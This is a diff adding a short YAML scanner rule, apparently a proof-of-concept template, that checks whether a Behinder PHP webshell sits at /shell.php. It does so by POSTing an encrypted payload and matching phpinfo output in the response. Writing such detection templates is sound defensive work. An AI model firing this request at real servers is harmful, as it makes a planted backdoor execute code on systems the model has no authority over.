@@ -1,0 +1,15 @@
+name: poc-yaml-behider-php-backdoor
+rules:
+  - method: POST
+    path: "/shell.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      4eNW1rQ1TnE2zNJbafdykw==
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b'phpinfo()') && response.body.bcontains(b'PHP Version')
+detail:
+  author: jingling
+  links:
+    - https://www.t00ls.net/thread-56337-1-1.html
